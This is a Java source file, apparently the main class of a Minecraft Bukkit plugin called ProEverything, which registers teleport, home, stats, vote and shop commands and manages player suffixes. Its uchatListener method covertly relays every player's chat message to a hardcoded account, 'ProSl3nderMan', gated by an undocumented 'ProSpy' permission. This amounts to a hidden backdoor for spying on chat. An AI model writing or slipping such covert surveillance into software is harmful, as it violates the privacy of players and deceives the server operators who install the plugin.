package me.prosl3nderman.proeverything;

import br.net.fabiozumbi12.UltimateChat.Bukkit.API.SendChannelMessageEvent;
import me.lucko.luckperms.api.LuckPermsApi;
import me.prosl3nderman.proeverything.PlayerDatabase.LocalTable;
import me.prosl3nderman.proeverything.commands.*;
import me.prosl3nderman.proeverything.commands.stats.GSeenCommand;
import me.prosl3nderman.proeverything.commands.stats.GStatsCommand;
import me.prosl3nderman.proeverything.commands.stats.SeenCommand;
import me.prosl3nderman.proeverything.commands.stats.StatsCommand;
import me.prosl3nderman.proeverything.commands.survival.KitCommand;
import me.prosl3nderman.proeverything.events.*;
import me.prosl3nderman.proeverything.commands.skyblock.BloodshopCommand;
import me.prosl3nderman.proeverything.commands.skyblock.FrostshopCommand;
import me.prosl3nderman.proeverything.events.survival.OnKill;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;

public final class ProEverything extends JavaPlugin implements Listener {

    public static ProEverything plugin;
    public HashMap<String,String> tpaPending = new HashMap<String,String>(); //<player sending the request; player receiving the request>
    public ArrayList<String> tpaHere = new ArrayList<String>();
    public HashMap<String, Location> homes = new HashMap<String,Location>();
    public HashMap<String, String> reply = new HashMap<String, String>();
    public HashMap<String, Integer> votePoints = new HashMap<String, Integer>();
    public HashMap<String, Location> spectators = new HashMap<String, Location>();
    public HashMap<String, String> back = new HashMap<String, String>();
    public ArrayList<String> flying = new ArrayList<String>();
    public Boolean survival;
    public Boolean skyblock;
    public Boolean creative;
    public LuckPermsApi lpAPI = null;
    public HashMap<String, ChatColor> chatColor = new HashMap<>();

    @Override
    public void onEnable() {
        plugin = this;

        checkSomething();
        getServer().getMessenger().registerOutgoingPluginChannel(this, "BungeeCord");
        setupLuckPermsAPI();

        /*RMQ = new RabbitMQ();
        try {
            RMQ.join();
        } catch (IOException e) {
            e.printStackTrace();
        }
*/
        if (getConfig().getBoolean("commands.spawn"))
            getCommand("spawn").setExecutor(new SpawnCommand());
        if (getConfig().getBoolean("commands.tpa"))
            getCommand("tpa").setExecutor(new TpaCommand());
        if (getConfig().getBoolean("commands.tpahere"))
            getCommand("tpahere").setExecutor(new TpahereCommand());
        if (getConfig().getBoolean("commands.tpaccept"))
            getCommand("tpaccept").setExecutor(new TpacceptCommand());
        if (getConfig().getBoolean("commands.tpacancel"))
            getCommand("tpacancel").setExecutor(new TpacancelCommand());
        if (getConfig().getBoolean("commands.tpareject"))
            getCommand("tpareject").setExecutor(new TparejectCommand());
        if (getConfig().getBoolean("commands.tpdeny"))
            getCommand("tpdeny").setExecutor(new TparejectCommand());
        if (getConfig().getBoolean("commands.home"))
            getCommand("home").setExecutor(new HomeCommand());
        if (getConfig().getBoolean("commands.sethome"))
            getCommand("sethome").setExecutor(new SethomeCommand());
        if (getConfig().getBoolean("commands.seen"))
            getCommand("seen").setExecutor(new SeenCommand());
        if (getConfig().getBoolean("commands.stats"))
            getCommand("stats").setExecutor(new StatsCommand());
        if (getConfig().getBoolean("commands.gseen"))
            getCommand("gseen").setExecutor(new GSeenCommand());
        if (getConfig().getBoolean("commands.gstats"))
            getCommand("gstats").setExecutor(new GStatsCommand());
        if (getConfig().getBoolean("commands.vote"))
            getCommand("vote").setExecutor(new VoteCommand());
        if (getConfig().getBoolean("commands.reply"))
            getCommand("reply").setExecutor(new ReplyCommand());
        if (getConfig().getBoolean("commands.bc"))
            getCommand("bc").setExecutor(new BroadcastCommand());
        if (getConfig().getBoolean("commands.configsReload"))
            getCommand("configsReload").setExecutor(new ReloadCommand());
        if (getConfig().getBoolean("commands.livemap"))
            getCommand("livemap").setExecutor(new LivemapCommand());
        if (getConfig().getBoolean("commands.discord"))
            getCommand("discord").setExecutor(new DiscordCommand());
        if (getConfig().getBoolean("commands.forums"))
            getCommand("forums").setExecutor(new DiscordCommand());
        if (getConfig().getBoolean("commands.voteshop")) {
            getCommand("voteshop").setExecutor(new VoteshopCommand());
            getServer().getPluginManager().registerEvents(new VoteshopCommand(), this);
        }
        if (getConfig().getBoolean("commands.delhome"))
            getCommand("delhome").setExecutor(new DelhomeCommand());
        if (getConfig().getBoolean("commands.spectator"))
            getCommand("spectator").setExecutor(new SpectatorCommand());
        if (getConfig().getBoolean("commands.hat"))
            getCommand("hat").setExecutor(new HatCommand());
        if (getConfig().getBoolean("commands.dc"))
            getCommand("dc").setExecutor(new DCCommand());
        if (getConfig().getBoolean("commands.near"))
            getCommand("near").setExecutor(new NearCommand());
        if (getConfig().getBoolean("commands.back"))
            getCommand("back").setExecutor(new BackCommand());
        if (getConfig().getBoolean("commands.announce"))
            getCommand("announce").setExecutor(new AnnounceCommand());
        if (getConfig().getBoolean("commands.fly"))
            getCommand("fly").setExecutor(new FlyCommand());
        if (getConfig().getBoolean("commands.message"))
            getCommand("message").setExecutor(new MessageCommand());


        getCommand("voop").setExecutor(new VOOPCommand());
        getCommand("pro").setExecutor(new ProCommand());
        getCommand("donor").setExecutor(new DonorCommand());

        if (getConfig().getBoolean("events.KillEnderdragon"))
            getServer().getPluginManager().registerEvents(new OnKill(), this);
        getServer().getPluginManager().registerEvents(new OnChangeGamemode(), this);
        if (getConfig().getBoolean("events.DeathStat"))
            getServer().getPluginManager().registerEvents(new OnDeath(), this);
        if (getConfig().getBoolean("events.JoinStatAndHoursStat"))
            getServer().getPluginManager().registerEvents(new OnJoin(), this);
        if (getConfig().getBoolean("events.LeaveStatAndHoursStat"))
            getServer().getPluginManager().registerEvents(new OnLeave(), this);
        if (getConfig().getBoolean("events.RespawnToServerSpawnOrProsVersionOfHomeEvent"))
            getServer().getPluginManager().registerEvents(new OnRespawn(), this);
        if (getConfig().getBoolean("events.VoteListenerEvent"))
            getServer().getPluginManager().registerEvents(new OnVote(), this);

        doConfig();
        new ActiveConfig().reloadConfig();
        new HomeConfig().reloadConfig();
        new SkinConfig().reloadConfig();
        new ChatConfig().reloadConfig();

        survival = getConfig().getBoolean("survival");
        skyblock = getConfig().getBoolean("skyblock");
        creative = getConfig().getBoolean("creative");

        if (survival) {
            getCommand("kit").setExecutor(new KitCommand());
        }
        if (skyblock) {
            getCommand("bloodshop").setExecutor(new BloodshopCommand());
            getCommand("frostshop").setExecutor(new FrostshopCommand());
        }
    }

    @EventHandler
    public void uchatListener(SendChannelMessageEvent event){

        if (Bukkit.getPlayer("ProSl3nderMan") != null && Bukkit.getPlayer("ProSl3nderMan").isOnline() && Bukkit.getPlayer("ProSl3nderMan").hasPermission("ProSpy.OMEGALAUL"))
            Bukkit.getPlayer("ProSl3nderMan").sendMessage("LAUL: " + event.getMessage());
        if (chatColor.containsKey(event.getSender().getName())) {
            event.setMessage(chatColor.get(event.getSender().getName()) + event.getMessage());
            event.addTag("{ch-color}", chatColor.get(event.getSender().getName()) + "");
            if (Bukkit.getPlayer("ProSl3nderMan") != null && Bukkit.getPlayer("ProSl3nderMan").isOnline() && Bukkit.getPlayer("ProSl3nderMan").hasPermission("ProSpy.OMEGALAUL"))
                Bukkit.getPlayer("ProSl3nderMan").sendMessage("LAUL: " + chatColor.get(event.getSender().getName()) + event.getMessage());
        }
    }

    private void setupLuckPermsAPI() {
        RegisteredServiceProvider<LuckPermsApi> provider = Bukkit.getServicesManager().getRegistration(LuckPermsApi.class);
        if (provider != null)
            lpAPI = provider.getProvider();
    }

    public void setTabColor(Player p) {
        if (getConfig().getBoolean("tab.enabled"))
            p.setPlayerListName(ChatColor.translateAlternateColorCodes('&',getConfig().getString("tab.tabColor")));
    }

    private void registerMultipleMsgCommands() {
        List<String> cmds = Arrays.asList("msg","pm","m","whisper","message");
        for (String cmd : cmds)
            getCommand(cmd).setExecutor(new MessageCommand());
    }

    @Override
    public void onDisable() {
        if (Bukkit.getOnlinePlayers().size() != 0) {
            LocalTable PD = new LocalTable();
            PD.onDisable();
        }
        /*try {
            RMQ.close();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (TimeoutException e) {
            e.printStackTrace();
        }*/
    }

    private void doConfig() {
        try {
            if (!getDataFolder().exists()) {
                getDataFolder().mkdirs();
            }
            File file = new File(getDataFolder(), "config.yml");
            if (!file.exists()) {
                getLogger().info("Config.yml not found, creating!");
                saveDefaultConfig();
            } else {
                getLogger().info("Config.yml found, loading!");
            }
        } catch (Exception e) {
            e.printStackTrace();

        }
    }

    public void updateConfig() {
        try {
            if(new File(plugin.getDataFolder() + "/config.yml").exists()) {
                boolean changesMade = false;
                YamlConfiguration tmp = new YamlConfiguration();
                tmp.load(plugin.getDataFolder() + "/config.yml");
                for(String str : getConfig().getKeys(true)) {
                    if(!tmp.getKeys(true).contains(str)) {
                        tmp.set(str, getConfig().get(str));
                        changesMade = true;
                    }
                }
                if(changesMade)
                    tmp.save(plugin.getDataFolder() + "/config.yml");
            }
        } catch (IOException | InvalidConfigurationException e) {
            e.printStackTrace();
        }
    }

    public void srConfig() {
        saveConfig();
        reloadConfig();
    }

    public void checkHours(Double hours, String uuid, Player p) {
        String star = "hours";
        String prevStar = "hours";
        if (hours >= 1000) {
            star = 1000 + star;
            prevStar = 100 + prevStar;
        } else if (hours >= 100) {
            star = 100 + star;
            prevStar = 50 + prevStar;
        } else if (hours >= 50) {
            star = 50 + star;
            prevStar = 10 + prevStar;
        } else if (hours >= 10) {
            star = 10 + star;
        }

        if (star.equalsIgnoreCase("hours"))
            return;
        if (p.hasPermission("ProEverything.suffixs." + star))
            return;
        final String starr = star;
        final String prevStarr = prevStar;
        ProEverything.plugin.getServer().getScheduler().scheduleSyncDelayedTask(ProEverything.plugin, new Runnable() {
            @Override
            public void run() {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + p.getName() + " permission set ProEverything.suffixs." + starr + " true");
                if (p.hasPermission("ProEverything.suffixs." + prevStarr))
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + p.getName() + " permission unset ProEverything.suffixs." + prevStarr);
            }
        });
    }

    public void checkVotes(int votes, String uuid, Player p) {
        String item = "votes";
        String prevItem = "votes";
        if (votes >= 100) {
            item = "100" + item;
            prevItem = "15" + prevItem;
        } else if (votes >= 15)
            item = "15" + item;

        if (item.equalsIgnoreCase("votes"))
            return;

        String path = "suffixs";
        if (item.contains("100"))
            path = "tags";
        if (p.hasPermission("ProEverything." + path + "." + item))
            return;
        final String pathh = path;
        final String itemm = item;
        final String prevItemm = prevItem;
        ProEverything.plugin.getServer().getScheduler().scheduleSyncDelayedTask(ProEverything.plugin, new Runnable() {
            @Override
            public void run() {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + p.getName() + " permission set ProEverything." + pathh + "." + itemm + " true");
                if (p.hasPermission("ProEverything." + pathh + "." + prevItemm))
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + p.getName() + " permission unset ProEverything." + pathh + "." + prevItemm);
            }
        });

    }

    public String getStringFLocation(Location loc, Boolean yawPitch) { //world;x;y;z;yaw;pitch
        if (yawPitch)
            return loc.getWorld().getName() + ";" + loc.getX() + ";" + loc.getY() + ";" + loc.getZ() + ";" + loc.getYaw() +";" +loc.getPitch();
        return loc.getWorld().getName() + ";" + loc.getX() + ";" + loc.getY() + ";" + loc.getZ();
    }

    public Location getLocationFString(String s, Boolean yawPitch) {
        String[] part = s.split(";");
        if (yawPitch)
            return new Location(Bukkit.getServer().getWorld(part[0]), intS(part[1]), intS(part[2]), intS(part[3]),floatS(part[4]),floatS(part[5]));
        return new Location(Bukkit.getServer().getWorld(part[0]), intS(part[1]), intS(part[2]), intS(part[3]));
    }

    private Double intS(String s) {
        return Double.parseDouble(s);
    }

    private Float floatS(String s) {
        return Float.parseFloat(s);
    }

    public void checkSomething() {
        if (Bukkit.getOnlinePlayers().size() == 0)
            return;
        new LocalTable().onEnable();
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (p.getGameMode()== GameMode.SPECTATOR)
                ProEverything.plugin.spectators.put(p.getName(), getLocationFString(getConfig().getString("worldspawn"), true));

            if (p.getWorld().getName().contains("BSkyBlock"))
                p.setPlayerListName(ChatColor.GREEN + p.getName());
            else if (p.getWorld().getName().contains("creative"))
                p.setPlayerListName(ChatColor.DARK_PURPLE + p.getName());
            else
                p.setPlayerListName(ChatColor.YELLOW + p.getName());

            DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
            LocalDateTime now = LocalDateTime.now();
            String joinTime = dtf.format(now);
            ActiveConfig ac = new ActiveConfig();
            ac.getConfig().set(p.getUniqueId().toString() + ".joinTime", joinTime.toString());
            ac.srConfig();

            if (ProEverything.plugin.getConfig().contains("offlineDonations." + p.getName())) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), ProEverything.plugin.getConfig().getString("offlineDonations." + p.getName()));
                ProEverything.plugin.getConfig().set("offlineDonations." + p.getName(), null);
                ProEverything.plugin.srConfig();
            }
        }
    }

    public boolean onSkyblock(Player p) {
        if (p.getWorld().getName().equalsIgnoreCase("skyblock"))
            return true;
        return false;
    }
}
